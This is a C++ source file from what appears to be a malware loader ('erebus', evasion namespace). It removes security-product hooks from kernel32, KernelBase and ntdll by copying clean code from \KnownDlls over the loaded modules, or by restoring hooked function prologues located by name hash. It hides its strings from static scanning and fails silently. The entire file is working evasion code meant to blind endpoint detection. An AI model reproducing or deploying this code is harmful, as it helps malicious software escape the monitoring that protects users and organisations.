/**
 * @file unhook_extended.cpp
 * @brief Extended DLL unhooking - kernel32, KernelBase, and selective restore.
 *
 * Provides three unhook paths beyond the existing ntdll-only UnhookNtdll():
 *
 *   UnhookKernel32()    - full .text overlay from \KnownDlls\kernel32.dll
 *   UnhookKernelbase()  - full .text overlay from \KnownDlls\KernelBase.dll
 *   UnhookSelective()   - per-function prologue compare-and-patch; only the
 *                         functions whose first 5 bytes differ from the clean
 *                         KnownDlls view (indicating a hook) are restored.
 *                         Restores the first 16 bytes of each hooked function
 *                         - enough to cover a 5-byte jmp hook and leave the
 *                         rest of the prologue intact.
 *
 * All three variants follow the same pattern as UnhookNtdll():
 *   1. Resolve bootstrap Nt* functions from the (possibly hooked) ntdll.
 *   2. Open \KnownDlls\<dll>.dll via NtOpenSection.
 *   3. Map a read-only view of the clean section.
 *   4. Parse both the loaded module and the clean view as PE images.
 *   5. Locate .text (full) or target export (selective) in both images.
 *   6. Flip protection, copy, restore.
 *   7. Unmap the clean view.
 *
 * Design tradeoffs (same as ntdll_unhook.cpp):
 *   - Bootstrap calls go through (possibly hooked) stubs; a pass-through hook
 *     will telemeter the operation but cannot prevent it.
 *   - Non-fatal: every failure bails out silently so the loader can continue.
 *   - Only .text is overlaid; all other sections stay intact.
 *
 * Selective unhook specifics:
 *   - Resolves each hashed function name in both the live module and the
 *     clean view using the same EAT walk logic as GetProcAddressC().
 *   - Compares the first 5 bytes (minimum hook size) to detect modifications.
 *   - Copies the first 16 bytes from the clean view on mismatch - this covers
 *     5-byte jmp hooks, 14-byte absolute jmp, and leaves standard x64
 *     prologues intact past the copied window.
 *   - Only modules in ntdll, kernel32, and kernelbase are considered as the
 *     clean-source KnownDlls candidates; the list is extended as needed.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/unhook_extended.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#include "../../include/config.hpp"

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

typedef NTSTATUS (NTAPI *typeNtOpenSection_ext)(
    PHANDLE        SectionHandle,
    ACCESS_MASK    DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Internal: resolve the five bootstrap Nt* functions we need for any
    // KnownDlls mapping. Returns FALSE if any required pointer is missing.
    // ------------------------------------------------------------------
    struct BootstrapPtrs
    {
        typeNtOpenSection_ext        NtOpenSection;
        typeNtMapViewOfSection       NtMapViewOfSection;
        typeNtUnmapViewOfSection     NtUnmapViewOfSection;
        typeNtProtectVirtualMemory   NtProtectVirtualMemory;
        typeNtClose                  NtClose;
        typeRtlInitUnicodeString     RtlInitUnicodeString;
    };

    static BOOL ResolveBootstrap(BootstrapPtrs& bp)
    {
        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) return FALSE;

        ImportFunction(ntdll, NtOpenSection,          typeNtOpenSection_ext);
        ImportFunction(ntdll, NtMapViewOfSection,     typeNtMapViewOfSection);
        ImportFunction(ntdll, NtUnmapViewOfSection,   typeNtUnmapViewOfSection);
        ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
        ImportFunction(ntdll, NtClose,                typeNtClose);
        ImportFunction(ntdll, RtlInitUnicodeString,   typeRtlInitUnicodeString);

        if (!NtOpenSection || !NtMapViewOfSection || !NtUnmapViewOfSection
            || !NtProtectVirtualMemory || !NtClose || !RtlInitUnicodeString)
            return FALSE;

        bp.NtOpenSection          = NtOpenSection;
        bp.NtMapViewOfSection     = NtMapViewOfSection;
        bp.NtUnmapViewOfSection   = NtUnmapViewOfSection;
        bp.NtProtectVirtualMemory = NtProtectVirtualMemory;
        bp.NtClose                = NtClose;
        bp.RtlInitUnicodeString   = RtlInitUnicodeString;
        return TRUE;
    }

    // ------------------------------------------------------------------
    // Internal: open a KnownDlls section and map it read-only.
    // `knownPath` must be a stack-resident WCHAR array ending in L'\0'.
    // On success, sets *pCleanBase and *pCleanSize; caller must unmap.
    // ------------------------------------------------------------------
    static BOOL MapKnownDll(
        BootstrapPtrs& bp,
        WCHAR*         knownPath,
        PVOID*         pCleanBase,
        SIZE_T*        pCleanSize)
    {
        UNICODE_STRING us;
        bp.RtlInitUnicodeString(&us, knownPath);

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hSection = NULL;
        NTSTATUS status = bp.NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
        if (!NT_SUCCESS(status) || !hSection) return FALSE;

        PVOID  base = NULL;
        SIZE_T size = 0;
        status = bp.NtMapViewOfSection(
            hSection,
            (HANDLE)(LONG_PTR)-1,
            &base, 0, 0, NULL, &size,
            (SECTION_INHERIT)ViewUnmap,
            0, PAGE_READONLY
        );
        bp.NtClose(hSection);

        if (!NT_SUCCESS(status) || !base) return FALSE;

        *pCleanBase = base;
        *pCleanSize = size;
        return TRUE;
    }

    // ------------------------------------------------------------------
    // Internal: overlay the .text section of a loaded module with the
    // corresponding bytes from an already-mapped clean KnownDlls view.
    // Returns TRUE if the overlay was performed.
    // ------------------------------------------------------------------
    static BOOL OverlayText(
        BootstrapPtrs& bp,
        PVOID          loadedBase,
        PVOID          cleanBase)
    {
        auto parsePe = [](PVOID base, PIMAGE_NT_HEADERS* outNt) -> BOOL {
            if (!base) return FALSE;
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
            *outNt = nt;
            return TRUE;
        };

        PIMAGE_NT_HEADERS loadedNt = NULL;
        PIMAGE_NT_HEADERS cleanNt  = NULL;
        if (!parsePe(loadedBase, &loadedNt) || !parsePe(cleanBase, &cleanNt))
            return FALSE;

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(loadedNt);
        BOOL any_overlay = FALSE;

        for (WORD i = 0; i < loadedNt->FileHeader.NumberOfSections; i++, section++)
        {
            if (!(section->Name[0] == '.' && section->Name[1] == 't'
                  && section->Name[2] == 'e' && section->Name[3] == 'x'
                  && section->Name[4] == 't'))
                continue;

            PVOID  target = (PVOID)((PBYTE)loadedBase + section->VirtualAddress);
            PVOID  clean  = (PVOID)((PBYTE)cleanBase  + section->VirtualAddress);
            SIZE_T region = section->Misc.VirtualSize;
            if (region == 0) continue;

            PVOID  protBase = target;
            SIZE_T protSize = region;
            ULONG  oldProtect = 0;

            NTSTATUS status = bp.NtProtectVirtualMemory(
                (HANDLE)(LONG_PTR)-1,
                &protBase, &protSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
            );
            if (!NT_SUCCESS(status)) continue;

            RtlCopyMemory(target, clean, region);
            any_overlay = TRUE;

            protBase = target;
            protSize = region;
            ULONG dummy = 0;
            bp.NtProtectVirtualMemory(
                (HANDLE)(LONG_PTR)-1,
                &protBase, &protSize,
                oldProtect, &dummy
            );
            break;   // only one .text section per PE
        }

        return any_overlay;
    }

    // ------------------------------------------------------------------
    // Internal: resolve an export by FNV-1a hash in a PE image base.
    // Returns NULL if not found. Mirrors GetProcAddressC() EAT walk.
    // ------------------------------------------------------------------
    static PVOID ResolveExportByHash(PVOID imageBase, ULONG targetHash)
    {
        if (!imageBase) return NULL;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

        IMAGE_DATA_DIRECTORY& expDir =
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL;

        PIMAGE_EXPORT_DIRECTORY ied =
            (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + expDir.VirtualAddress);

        PDWORD  rvaNames  = (PDWORD) ((PBYTE)imageBase + ied->AddressOfNames);
        PWORD   rvaOrds   = (PWORD)  ((PBYTE)imageBase + ied->AddressOfNameOrdinals);
        PDWORD  rvaFuncs  = (PDWORD) ((PBYTE)imageBase + ied->AddressOfFunctions);

        for (DWORD i = 0; i < ied->NumberOfNames; i++)
        {
            LPCSTR name = (LPCSTR)((PBYTE)imageBase + rvaNames[i]);
            if (HashStringFowlerNollVoVariant1a(name) == targetHash)
            {
                DWORD rva = rvaFuncs[rvaOrds[i]];
                return (PVOID)((PBYTE)imageBase + rva);
            }
        }
        return NULL;
    }

    // ------------------------------------------------------------------
    // UnhookKernel32
    // ------------------------------------------------------------------

    BOOL UnhookKernel32()
    {
        BootstrapPtrs bp = {};
        if (!ResolveBootstrap(bp)) return FALSE;

        HMODULE hK32 = ImportModule("kernel32.dll");
        if (!hK32) return FALSE;

        // Build the path character-by-character so no contiguous plaintext
        // string for \KnownDlls\kernel32.dll lands in .rdata.
        WCHAR known_path[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.',
            L'd', L'l', L'l', L'\0'
        };

        PVOID  cleanBase = NULL;
        SIZE_T cleanSize = 0;
        if (!MapKnownDll(bp, known_path, &cleanBase, &cleanSize)) return FALSE;

        BOOL result = OverlayText(bp, (PVOID)hK32, cleanBase);
        bp.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);

        if (result)
            LOG_SUCCESS("kernel32.dll .text section unhooked");
        else
            LOG_ERROR("kernel32.dll unhook failed (.text overlay)");

        return result;
    }

    // ------------------------------------------------------------------
    // UnhookKernelbase
    // ------------------------------------------------------------------

    BOOL UnhookKernelbase()
    {
        BootstrapPtrs bp = {};
        if (!ResolveBootstrap(bp)) return FALSE;

        HMODULE hKBase = ImportModule("kernelbase.dll");
        if (!hKBase) return FALSE;

        WCHAR known_path[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'K', L'e', L'r', L'n', L'e', L'l', L'B', L'a', L's',
            L'e', L'.', L'd', L'l', L'l', L'\0'
        };

        PVOID  cleanBase = NULL;
        SIZE_T cleanSize = 0;
        if (!MapKnownDll(bp, known_path, &cleanBase, &cleanSize)) return FALSE;

        BOOL result = OverlayText(bp, (PVOID)hKBase, cleanBase);
        bp.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);

        if (result)
            LOG_SUCCESS("KernelBase.dll .text section unhooked");
        else
            LOG_ERROR("KernelBase.dll unhook failed (.text overlay)");

        return result;
    }

    // ------------------------------------------------------------------
    // UnhookSelective
    //
    // For each hash in func_hashes, locate the export in the clean KnownDlls
    // view for whichever module owns it (ntdll → kernel32 → kernelbase,
    // tried in order), compare the first 5 bytes against the live mapping,
    // and restore 16 bytes from the clean view if a difference is detected.
    //
    // 5 bytes is the minimum hook size (e5 jmp rel32); 16 bytes covers both
    // that and the 14-byte absolute jmp sequence (`mov rax, abs64; jmp rax`)
    // while leaving the function body untouched.
    // ------------------------------------------------------------------

    BOOL UnhookSelective(const ULONG* func_hashes, SIZE_T count)
    {
        if (!func_hashes || count == 0) return TRUE;

        BootstrapPtrs bp = {};
        if (!ResolveBootstrap(bp)) return FALSE;

        // Build KnownDlls paths for ntdll, kernel32, kernelbase.
        WCHAR path_ntdll[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l',
            L'\0'
        };
        WCHAR path_k32[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.',
            L'd', L'l', L'l', L'\0'
        };
        WCHAR path_kbase[] = {
            L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's',
            L'\\', L'K', L'e', L'r', L'n', L'e', L'l', L'B', L'a', L's',
            L'e', L'.', L'd', L'l', L'l', L'\0'
        };

        // Map all three clean views up front; if a mapping fails we skip
        // that module's functions silently.
        struct ModuleView {
            HMODULE liveBase;
            PVOID   cleanBase;
            SIZE_T  cleanSize;
        };

        ModuleView views[3] = {};
        views[0].liveBase = ImportModule("ntdll.dll");
        views[1].liveBase = ImportModule("kernel32.dll");
        views[2].liveBase = ImportModule("kernelbase.dll");

        MapKnownDll(bp, path_ntdll, &views[0].cleanBase, &views[0].cleanSize);
        MapKnownDll(bp, path_k32,   &views[1].cleanBase, &views[1].cleanSize);
        MapKnownDll(bp, path_kbase, &views[2].cleanBase, &views[2].cleanSize);

        static const SIZE_T kPrologueWindow = 16;
        DWORD restored = 0;

        for (SIZE_T fi = 0; fi < count; fi++)
        {
            ULONG hash = func_hashes[fi];

            // Try each module in priority order (ntdll first, then win32).
            for (int m = 0; m < 3; m++)
            {
                if (!views[m].liveBase || !views[m].cleanBase) continue;

                PVOID liveFn  = ResolveExportByHash((PVOID)views[m].liveBase,  hash);
                PVOID cleanFn = ResolveExportByHash(        views[m].cleanBase, hash);

                if (!liveFn || !cleanFn) continue;

                // Compare first 5 bytes.
                if (RtlCompareMemory(liveFn, cleanFn, 5) == 5)
                    break;   // No hook detected in this module; stop searching.

                // Hook detected - restore the first kPrologueWindow bytes.
                PVOID  protBase = liveFn;
                SIZE_T protSize = kPrologueWindow;
                ULONG  oldProtect = 0;

                NTSTATUS status = bp.NtProtectVirtualMemory(
                    (HANDLE)(LONG_PTR)-1,
                    &protBase, &protSize,
                    PAGE_EXECUTE_READWRITE,
                    &oldProtect
                );
                if (!NT_SUCCESS(status)) break;

                RtlCopyMemory(liveFn, cleanFn, kPrologueWindow);
                restored++;

                protBase = liveFn;
                protSize = kPrologueWindow;
                ULONG dummy = 0;
                bp.NtProtectVirtualMemory(
                    (HANDLE)(LONG_PTR)-1,
                    &protBase, &protSize,
                    oldProtect, &dummy
                );
                break;   // resolved from this module; move to next hash
            }
        }

        // Unmap all clean views.
        for (int m = 0; m < 3; m++)
        {
            if (views[m].cleanBase)
                bp.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, views[m].cleanBase);
        }

        if (restored > 0)
            LOG_SUCCESS("Selective unhook: hooked function(s) restored");
        else
            LOG_INFO("Selective unhook: no hooks detected in target function list");

        return TRUE;
    }

} // namespace evasion
} // namespace erebus
